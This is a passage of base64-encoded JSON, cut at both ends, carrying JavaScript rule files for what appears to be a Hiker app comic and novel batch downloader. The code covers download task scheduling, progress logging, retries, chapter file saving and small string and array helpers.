iXe+8jFtcXFwiKSArIFxcXCJd44CCXFxcIik7XFxuICAgICAgICAgICAgdXBkYXRlSXRlbSh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwiW+WkhOeQhuWksei0pV1cXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcInx85LiL6L295o6n5Yi2XFxcIlxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9IGVsc2UgaWYgKGZhaWxUZWFtLmxlbmd0aCA+IDAgJiYgc3RhdHVzID09PSBcXFwiMVxcXCIpIHtcXG4gICAgICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXCI6c3RhdHVzXFxcIiwgXFxcIjRcXFwiKTtcXG4gICAgICAgICAgICBwdXRMb2coXFxcIltsaXN0ZW5lcl0j5bey5YGc5q2i5omA5pyJ5Lu75Yqh77yM5L2G5bey5pyJ6L+b5bqm5LiN5Lya5raI5aSxI1xcXCIpO1xcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIlvph43mlrDlvIDlp4tdXFxcIixcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCJ8fOS4i+i9veaOp+WItlxcXCJcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiYnJlYWtcXFwiO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXCI6c3RhdHVzXFxcIiwgXFxcIjJcXFwiKTtcXG4gICAgICAgICAgICBwdXRMb2coXFxcIuS4i+i9veS7u+WKoVtcXFwiICsgaW5mby5ib29rTmFtZSArIFxcXCJd5bey5YWo6YOo5oiQ5Yqf5a6M5oiQXFxcIik7XFxuICAgICAgICAgICAgdXBkYXRlSXRlbSh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwiW+i/lOWbnl1cXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcInx85LiL6L295o6n5Yi2XFxcIlxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgICAgICB0b2FzdChcXFwi5LiL6L295Lu75YqhW1xcXCIgKyBpbmZvLmJvb2tOYW1lICsgXFxcIl3lt7LlrozmiJBcXFwiKTtcXG4gICAgfVxcbiAgICBsZXQgdGFza1RlYW1DaHVuayA9IFtdO1xcbiAgICBpZiAoQ29uZmlnLnRocmVhZE51bSA+IDApIHtcXG4gICAgICAgIHRhc2tUZWFtQ2h1bmsgPSBUb29sLmNodW5rKHRhc2tUZWFtLCBDb25maWcudGhyZWFkTnVtKTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHRhc2tUZWFtQ2h1bmsgPSBbdGFza1RlYW1dO1xcbiAgICB9XFxuICAgIGZvciAobGV0IHRhc2tMaXN0IG9mIHRhc2tUZWFtQ2h1bmspIHtcXG4gICAgICAgIGJlKHRhc2tMaXN0LCB7XFxuICAgICAgICAgICAgZnVuYzogbGlzdGVuZXJcXG4gICAgICAgIH0pO1xcbiAgICAgICAgbGV0IHN0YXR1cyA9IGdldE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiMFxcXCIpO1xcbiAgICAgICAgaWYgKHN0YXR1cyA9PT0gXFxcIjFcXFwiKSB7XFxuICAgICAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgICAgIC8vbGV0IHN0YXR1cyA9IGdldE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiMFxcXCIpO1xcbiAgICAgICAgICAgIGxldCBmYWlsVGVhbSA9IGJhdGNoVGVhbS5maWx0ZXIodiA9PiAhc3VjY2Vzc0NJRC5pbmNsdWRlcyh2KSk7XFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIEpTT04uc3RyaW5naWZ5KGZhaWxUZWFtKSk7XFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOnN0YXR1c1xcXCIsIFxcXCI0XFxcIik7XFxuICAgICAgICAgICAgcHV0TG9nKFxcXCJbbGlzdGVuZXJdI+W3suWBnOatouaJgOacieS7u+WKoe+8jOS9huW3suaciei/m+W6puS4jeS8mua2iOWksSNcXFwiKTtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCJb6YeN5paw5byA5aeLXVxcXCIsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFwifHzkuIvovb3mjqfliLZcXFwiXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgfVxcblxcbiAgICB9XFxuXFxuICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxufTtcXG5cXG4kLmV4cG9ydHMuYiA9IGZ1bmN0aW9uIGNvbWljKGNoYXB0ZXJUZWFtLCBpbmZvLCBNWV9JRCkge1xcbiAgICBpZiAoY2hhcHRlclRlYW0ubGVuZ3RoID09PSAwKSB7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v56m655qE5LiL6L296Zif5YiXXFxcIjtcXG4gICAgfVxcbiAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcblxcbiAgICBsZXQgbG9nTnVtID0gQ29uZmlnLmxvZ051bTtcXG4gICAgbGV0IGxvZ0NvdW50ID0gMDtcXG5cXG4gICAgZnVuY3Rpb24gcHV0TG9nKHRleHQpIHtcXG4gICAgICAgIGxvZyh0ZXh0KTtcXG4gICAgICAgIGlmIChsb2dDb3VudCA+PSBsb2dOdW0pIHtcXG4gICAgICAgICAgICBkZWxldGVJdGVtKE1ZX0lEICsgXFxcIiNsb2cjXFxcIiArIChsb2dDb3VudCAtIDEwKSk7XFxuICAgICAgICB9XFxuICAgICAgICBhZGRJdGVtQWZ0ZXIoTVlfSUQgKyBcXFwifHzml6Xlv5dcXFwiLCB7XFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgdGl0bGU6IFxcXCIkPlxcXCIgKyB0ZXh0LFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCIjbG9nI1xcXCIgKyBsb2dDb3VudFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICAgICAgbG9nQ291bnQrKztcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiB0YXNrKHRhc2tQYXJhbSkge1xcbiAgICAgICAgY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL1Rvb2wuanNcXFwiKTtcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgMTA7IGkrKykge1xcbiAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgIGxldCBwaWMgPSBUb29sLmhpa2VyUGljKHRhc2tQYXJhbS51cmwpO1xcbiAgICAgICAgICAgICAgICBUb29sLnBpY0Rvd25sb2FkKHBpY1swXSwgdGFza1BhcmFtLmNoYXB0ZXJQYXRoICsgKHRhc2tQYXJhbS5pICsgMSkgKyBcXFwiLmpwZ1xcXCIsIHBpY1sxXSwgdGFza1BhcmFtLmRlY29kZSk7XFxuICAgICAgICAgICAgICAgIGlmIChnZXRNeVZhcih0YXNrUGFyYW0uTVlfSUQgKyBcXFwiOnN0YXR1c1xcXCIsIFxcXCJcXFwiKSA9PT0gXFxcIjFcXFwiKSB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgZXJyb3JOdW0gPSAwO1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgICAgIGlmIChpID09PSA5KSB7XFxuICAgICAgICAgICAgICAgICAgICB0aHJvdyBlO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIHRhc2tQYXJhbS5DSUQ7XFxuICAgIH1cXG4gICAgbGV0IGNvdW50ID0gMDtcXG4gICAgbGV0IHRvdGFsQ291bnQgPSAwO1xcbiAgICBsZXQgc3VjY2Vzc0NJRCA9IFtdO1xcblxcbiAgICBmdW5jdGlvbiBsaXN0ZW5lcihwYXJhbSwgaWQsIGVycm9yLCByZXN1bHQpIHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgdG90YWxDb3VudCsrO1xcblxcbiAgICAgICAgICAgIGlmIChlcnJvciAhPSBudWxsKSB7XFxuICAgICAgICAgICAgICAgIHB1dExvZyhcXFwiW2xpc3RlbmVyXeS4i+i9veWksei0pe+8mlxcXCIgKyBpZCArIFxcXCI8RVJST1JAIFxcXCIgKyBlcnJvciArIFxcXCI+XFxcIik7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChyZXN1bHQgPT09IC0xKSB7XFxuICAgICAgICAgICAgICAgIHB1dExvZyhcXFwiW2xpc3RlbmVyXeW3suWBnOatou+8mlxcXCIgKyBpZCk7XFxuICAgICAgICAgICAgICAgIHRvdGFsQ291bnQgPSBwYXJhbS5waXZDb3VudDtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICBjb3VudCsrO1xcbiAgICAgICAgICAgICAgICBsZXQgcmF0aW8gPSAoKGNvdW50IC8gcGFyYW0ucGl2Q291bnQpKS50b0ZpeGVkKDQpO1xcbiAgICAgICAgICAgICAgICBsZXQgc3RyaXBDb3VudCA9IE1hdGguY2VpbChyYXRpbyAqIDEwKTtcXG4gICAgICAgICAgICAgICAgaWYgKHBhcmFtLnBpdkNvdW50ID09PSB0b3RhbENvdW50ICYmIHRvdGFsQ291bnQgPT09IGNvdW50KSB7XFxuICAgICAgICAgICAgICAgICAgICBzdWNjZXNzQ0lELnB1c2gocGFyYW0uQ0lEKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5LiL6L296L+b5bqm77yaXFxcIiArIChzdWNjZXNzQ0lELmxlbmd0aCkgKyBcXFwiL1xcXCIgKyBwYXJhbS50b3RhbCxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIuKWh1xcXCIucmVwZWF0KHN0cmlwQ291bnQpLmZvbnRjb2xvcihcXFwiI2ZmYWMyZFxcXCIpICsgXFxcIuKWh1xcXCIucmVwZWF0KDEwIC0gc3RyaXBDb3VudCkuZm9udGNvbG9yKFxcXCIjZTVlMWU0XFxcIikgKyBcXFwiIFxcXCIgKyBTdHJpbmcoKHJhdGlvICogMTAwKSkuc2xpY2UoMCwgNSkgKyBcXFwiJVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCJ8fOS4i+i9vei/m+W6plxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIC8vcHV0TG9nKFxcXCJbbGlzdGVuZXJd5bey5a6M5oiQ5LiL6L2977yaXFxcIiArIGlkKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgaWYgKHRvdGFsQ291bnQgIT09IHBhcmFtLnBpdkNvdW50KSByZXR1cm47XFxuICAgICAgICAgICAgaWYgKHRvdGFsQ291bnQgPT09IGNvdW50KSB7XFxuICAgICAgICAgICAgICAgIEZpbGUucmVuYW1lRmlsZShwYXJhbS5jaGFwdGVyUGF0aCwgcGFyYW0uQ0lEICsgXFxcIiRBJFxcXCIgKyBUb29sLnRleHRTaGllbGQocGFyYW0udGl0bGUpKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgdG90YWxDb3VudCA9IGNvdW50ID0gMDtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImJyZWFrXFxcIjtcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBsZXQgdGFza1RlYW0gPSBbXTtcXG4gICAgbGV0IG1haW5QYXRoID0gQ29uZmlnLmNvbWljUGF0aCArIFxcXCIvXFxcIiArIGluZm8ucnVsZU5hbWUgKyBcXFwiL1xcXCIgKyBUb29sLnRleHRTaGllbGQoaW5mby5ib29rTmFtZSkgKyBcXFwiL1xcXCI7XFxuICAgIGlmIChpbmZvLmJvb2tUb3BQaWMpIHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgbGV0IGJvb2tUb3BQaWMgPSBUb29sLmhpa2VyUGljKGluZm8uYm9va1RvcFBpYyk7XFxuICAgICAgICAgICAgVG9vbC5waWNEb3dubG9hZChib29rVG9wUGljWzBdLCBtYWluUGF0aCArIGluZm8uYm9va05hbWUgKyBcXFwiLmpwZ1xcXCIsIGJvb2tUb3BQaWNbMV0sIGluZm8uZGVjb2RlKTtcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBsb2coXFxcIjzlsIHpnaLkuIvovb3plJnor68+IFxcXCIgKyBlLm1lc3NhZ2UpO1xcbiAgICAgICAgfVxcbiAgICB9XFxuXFxuICAgIGZvciAobGV0IGsgPSAwOyBrIDwgY2hhcHRlclRlYW0ubGVuZ3RoOyBrKyspIHtcXG4gICAgICAgIGxldCBpdGVtID0gY2hhcHRlclRlYW1ba107XFxuICAgICAgICBsZXQgb3JkZXIgPSBrO1xcbiAgICAgICAgbGV0IGNoYXB0ZXJQYXRoID0gbWFpblBhdGggKyBpdGVtLkNJRCArIFxcXCIkQiRcXFwiICsgVG9vbC50ZXh0U2hpZWxkKGl0ZW0udGl0bGUpICsgXFxcIi9cXFwiO1xcbiAgICAgICAgbGV0IHBpY0xpc3QgPSBbXTtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgbGV0IGdldFBpY0xpc3QgPSBuZXcgRnVuY3Rpb24oXFxcImlucHV0XFxcIiwgXFxcInVybFxcXCIsIFxcXCJpbmRleFxcXCIsIFxcXCJ0aXRsZVxcXCIsIFxcXCJyZXR1cm5cXFwiICsgaW5mby5wYXJzZUNvZGUpO1xcbiAgICAgICAgICAgIHBpY0xpc3QgPSBnZXRQaWNMaXN0KGl0ZW0udXJsLCBpdGVtLnVybCwgaywgaXRlbS50aXRsZSk7XFxuICAgICAgICAgICAgaWYgKHR5cGVvZiBwaWNMaXN0ID09PSBcXFwic3RyaW5nXFxcIikge1xcbiAgICAgICAgICAgICAgICBwaWNMaXN0ID0gcGljTGlzdC5yZXBsYWNlKFxcXCJwaWNzOi8vXFxcIiwgXFxcIlxcXCIpLnNwbGl0KFxcXCImJlxcXCIpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBwdXRMb2coXFxcIjzmvKvnlLvlm77niYfop6PmnpDplJnor68+IFxcXCIgKyBlLm1lc3NhZ2UpO1xcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKHBpY0xpc3QubGVuZ3RoID09PSAwKSB7XFxuICAgICAgICAgICAgcHV0TG9nKFxcXCI85ryr55S75Zu+54mH6Kej5p6Q6ZSZ6K+v77ya5Zu+54mH6ZO+5o6l6L+U5Zue5Li656m6PlxcXCIpO1xcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgfVxcbiAgICAgICAgcGljTGlzdCA9IHBpY0xpc3QuZmlsdGVyKHAgPT4gcCk7XFxuICAgICAgICB2YXIgdGFza1RlYW0gPSBwaWNMaXN0Lm1hcCgodXJsLCBpKSA9PiAoe1xcbiAgICAgICAgICAgIGZ1bmM6IHRhc2ssXFxuICAgICAgICAgICAgaWQ6IGksXFxuICAgICAgICAgICAgcGFyYW06IHtcXG4gICAgICAgICAgICAgICAgdXJsOiB1cmwsXFxuICAgICAgICAgICAgICAgIGk6IGksXFxuICAgICAgICAgICAgICAgIGNoYXB0ZXJQYXRoOiBjaGFwdGVyUGF0aCxcXG4gICAgICAgICAgICAgICAgTVlfSUQ6IE1ZX0lELFxcbiAgICAgICAgICAgICAgICBkZWNvZGU6IGluZm8uZGVjb2RlXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSkpO1xcbiAgICAgICAgYmUodGFza1RlYW0sIHtcXG4gICAgICAgICAgICBmdW5jOiBsaXN0ZW5lcixcXG4gICAgICAgICAgICBwYXJhbToge1xcbiAgICAgICAgICAgICAgICBwaXZDb3VudDogcGljTGlzdC5sZW5ndGgsXFxuICAgICAgICAgICAgICAgIHRvdGFsOiBjaGFwdGVyVGVhbS5sZW5ndGgsXFxuICAgICAgICAgICAgICAgIG9yZGVyOiBvcmRlcixcXG4gICAgICAgICAgICAgICAgQ0lEOiBpdGVtLkNJRCxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0ZW0udGl0bGUsXFxuICAgICAgICAgICAgICAgIGNoYXB0ZXJQYXRoOiBjaGFwdGVyUGF0aFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICAgICAgaWYgKGdldE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiXFxcIikgPT09IFxcXCIxXFxcIikge1xcbiAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgfVxcbiAgICB9XFxuXFxuICAgIGxldCBzdGF0dXMgPSBnZXRNeVZhcihNWV9JRCArIFxcXCI6c3RhdHVzXFxcIiwgXFxcIjBcXFwiKTtcXG4gICAgamF2YS5sYW5nLlRocmVhZC5zbGVlcCg0MCk7XFxuICAgIC8vbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICBsZXQgZmFpbFRlYW0gPSBjaGFwdGVyVGVhbS5maWx0ZXIodiA9PiAhc3VjY2Vzc0NJRC5pbmNsdWRlcyh2LkNJRCkpO1xcbiAgICBsZXQgZmFpbE5hbWUgPSBmYWlsVGVhbS5tYXAoaXRlbSA9PiBpdGVtLnRpdGxlKTtcXG4gICAgbGV0IGJhdGNoVGVhbSA9IGZhaWxUZWFtLm1hcChpdGVtID0+IGl0ZW0uQ0lEKTtcXG5cXG4gICAgaWYgKGZhaWxUZWFtLmxlbmd0aCA+IDAgJiYgc3RhdHVzICE9PSBcXFwiMVxcXCIpIHtcXG4gICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcIjpiYXRjaFRlYW1cXFwiLCBKU09OLnN0cmluZ2lmeShiYXRjaFRlYW0pKTtcXG4gICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiM1xcXCIpO1xcbiAgICAgICAgcHV0TG9nKFxcXCLkuIvovb3lpLHotKU6W1xcXCIgKyBmYWlsTmFtZS5qb2luKFxcXCJd77yMW1xcXCIpICsgXFxcIl3jgIJcXFwiKTtcXG4gICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwiW+WkhOeQhuWksei0pV1cXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCJ8fOS4i+i9veaOp+WItlxcXCJcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfSBlbHNlIGlmIChmYWlsVGVhbS5sZW5ndGggPiAwICYmIHN0YXR1cyA9PT0gXFxcIjFcXFwiKSB7XFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXCI6YmF0Y2hUZWFtXFxcIiwgSlNPTi5zdHJpbmdpZnkoYmF0Y2hUZWFtKSk7XFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXCI6c3RhdHVzXFxcIiwgXFxcIjRcXFwiKTtcXG4gICAgICAgIHB1dExvZyhcXFwiW2xpc3RlbmVyXSPlt7LlgZzmraLmiYDmnInku7vliqHvvIzkvYblt7LmnInov5vluqbkuI3kvJrmtojlpLEjXFxcIik7XFxuICAgICAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIlvph43mlrDlvIDlp4tdXFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFwifHzkuIvovb3mjqfliLZcXFwiXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXCI6c3RhdHVzXFxcIiwgXFxcIjJcXFwiKTtcXG4gICAgICAgIHB1dExvZyhcXFwi5LiL6L295Lu75YqhW1xcXCIgKyBpbmZvLmJvb2tOYW1lICsgXFxcIl3lt7Llhajpg6jmiJDlip/lrozmiJBcXFwiKTtcXG4gICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwiW+i/lOWbnl1cXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCJ8fOS4i+i9veaOp+WItlxcXCJcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfVxcbiAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiNmZy7mibnph4/kuLvnqIvluo9cIixcInBhdGhcIjpcIkJhdGNoLmV4ZS5qc1wiLFwicnVsZVwiOlwiY29uc3QgTWlhbiA9ICQucmVxdWlyZShcXFwibWFpbkRvd25sb2FkXFxcIik7XFxuZnVuY3Rpb24gY29taWModGFza1BhcmFtKSB7XFxuICAgIGxldCB7XFxuICAgICAgICBjaGFwdGVySXRlbSxcXG4gICAgICAgIGluZm8sXFxuICAgICAgICBNWV9JRCxcXG4gICAgfSA9IHRhc2tQYXJhbTtcXG4gICAgcmV0dXJuIE1pYW4uY29taWMoY2hhcHRlckl0ZW0sIGluZm8sIGNoYXB0ZXJJdGVtLkNJRCwgTVlfSUQsIHRydWUpfHxjaGFwdGVySXRlbS5DSUQ7XFxufVxcblxcbmZ1bmN0aW9uIG5vdmVsKHRhc2tQYXJhbSkge1xcbiAgICBsZXQge1xcbiAgICAgICAgY2hhcHRlckl0ZW0sXFxuICAgICAgICBpbmZvLFxcbiAgICAgICAgTVlfSUQsXFxuICAgIH0gPSB0YXNrUGFyYW07XFxuICAgIHJldHVybiBNaWFuLm5vdmVsKGNoYXB0ZXJJdGVtLCBpbmZvLCBjaGFwdGVySXRlbS5DSUQsTVlfSUQsIHRydWUpfHxjaGFwdGVySXRlbS5DSUQ7XFxuICAgIC8vRmlsZS5yZW5hbWVGaWxlKGNoYXB0ZXJQYXRoLCBjaGFwdGVySXRlbS5DSUQgKyBcXFwiJEEkXFxcIiArIGNoYXB0ZXJJdGVtLnRpdGxlKTtcXG59XFxudmFyICRleGUgPSB7XFxuICAgIGNvbWljOiBjb21pYyxcXG4gICAgbm92ZWw6IG5vdmVsXFxufTtcXG4kLmV4cG9ydHMgPSBmdW5jdGlvbih0YXNrUGFyYW0pIHtcXG4gICAgcmV0dXJuICRleGVbdGFza1BhcmFtLmluZm8udHlwZV0odGFza1BhcmFtKTtcXG59O1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI2ZnLuaZrumAmuS4u+eoi+W6j1wiLFwicGF0aFwiOlwiRG93bmxvYWQuZXhlLmpzXCIsXCJydWxlXCI6XCJjb25zdCBNaWFuID0gJC5yZXF1aXJlKFxcXCJtYWluRG93bmxvYWRcXFwiKTtcXG5mdW5jdGlvbiBub3ZlbChpdGVtLCBpbmZvLCBvcmRlciwgTVlfSUQpIHtcXG4gICAgTWlhbi5ub3ZlbChpdGVtLCBpbmZvLCBvcmRlcik7XFxuICAgIHJldHVybiBcXFwidG9hc3Q6Ly9cXFwiICsgaW5mby5ib29rTmFtZSArIFxcXCJAXFxcIiArIGl0ZW0udGl0bGUgKyBcXFwiIOS4i+i9veWujOaIkFxcXCI7XFxufVxcblxcbmZ1bmN0aW9uIGNvbWljKGl0ZW0sIGluZm8sIG9yZGVyLCBNWV9JRCkge1xcbiAgICBNaWFuLmNvbWljKGl0ZW0sIGluZm8sIG9yZGVyKTtcXG4gICAgcmV0dXJuIFxcXCJ0b2FzdDovL1xcXCIgKyBpbmZvLmJvb2tOYW1lICsgXFxcIkBcXFwiICsgaXRlbS50aXRsZSArIFxcXCIg5LiL6L295a6M5oiQXFxcIjtcXG59XFxudmFyICRleGUgPSB7XFxuICAgIGNvbWljOiBjb21pYyxcXG4gICAgbm92ZWw6IG5vdmVsXFxufTtcXG4kLmV4cG9ydHMgPSBmdW5jdGlvbihpdGVtLCBpbmZvLCBvcmRlciwgTVlfSUQpIHtcXG4gICAgcmV0dXJuICRleGVbaW5mby50eXBlXShpdGVtLCBpbmZvLCBvcmRlciwgTVlfSUQpO1xcbn07XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjZi7pgJrnlKjlt6XlhbdcIixcInBhdGhcIjpcIlRvb2wuanNcIixcInJ1bGVcIjpcImNvbnN0IHYgPSB7XFxuICAgIHNwbGl0KHRleHQsIHRhcmdldCwgY291bnQpIHtcXG4gICAgICAgIGNvdW50ID0gY291bnQgPT09IHVuZGVmaW5lZCA/IDEgOiBjb3VudDtcXG4gICAgICAgIGxldCBhcnJheSA9IFt0ZXh0XTtcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgY291bnQ7IGkrKykge1xcbiAgICAgICAgICAgIHRleHQgPSBhcnJheVtpXTtcXG4gICAgICAgICAgICBsZXQgaW5kZXggPSB0ZXh0LmluZGV4T2YodGFyZ2V0KTtcXG4gICAgICAgICAgICBpZiAoaW5kZXggPT09IC0xKSB7XFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBhcnJheVtpXSA9IHRleHQuc2xpY2UoMCwgaW5kZXgpO1xcbiAgICAgICAgICAgIGFycmF5W2kgKyAxXSA9IHRleHQuc2xpY2UoaW5kZXggKyB0YXJnZXQubGVuZ3RoKTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBhcnJheTtcXG4gICAgfSxcXG4gICAgY2h1bmsoYXJyLCBzaXplKSB7XFxuICAgICAgICB2YXIgcmVzdWx0ID0gW107XFxuICAgICAgICBmb3IgKHZhciBpID0gMCwgbGVuID0gYXJyLmxlbmd0aDsgaSA8IGxlbjsgaSArPSBzaXplKSB7XFxuICAgICAgICAgICAgcmVzdWx0LnB1c2goYXJyLnNsaWNlKGksIGkgKyBzaXplKSk7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcbiAgICB9LFxcbiAgICBoaWtlclBpYyh1cmwpIHtcXG4gICAgICAgIHZhciBoZWFkZXJzID0ge307XFxuICAgICAgICBsZXQgdXJscyA9IHVybC5zcGxpdChcXFwiQFxcXCIpO1xcbiAgICAgICAgbGV0IHBpY1VybCA9IHVybHMuc2hpZnQoKTtcXG4gICAgICAgIGxldCBsZW5ndGggPSB1cmxzLmxlbmd0aDtcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICBsZXQgW2tleSwgdmFsdWVdID0gdi5zcGxpdCh1cmxzW2ldLCBcXFwiPVxcXCIpO1xcbiAgICAgICAgICAgIGlmIChrZXkgPT09IFxcXCJoZWFkZXJzXFxcIikge1xcbiAgICAgICAgICAgICAgICB0cnkge1xcbiAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihoZWFkZXJzLCBKU09OLnBhcnNlKHZhbHVlKSk7XFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICAgICAgICAgIGxvZyh